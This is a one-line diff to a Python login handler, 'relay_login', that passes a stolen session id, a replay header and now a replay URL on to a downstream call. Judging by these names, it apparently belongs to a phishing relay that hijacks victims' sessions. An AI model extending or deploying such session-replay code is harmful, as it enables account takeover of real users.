@@ -91,6 +91,7 @@ def relay_login():
         email,
         sid=stolen.get("sid", ""),
         replay_header=record["replay_header"],
+        replay_url=record["replay_url"],
     )
 
     resp = make_response(redirect(f"{PUBLIC_URL}/workspace"))
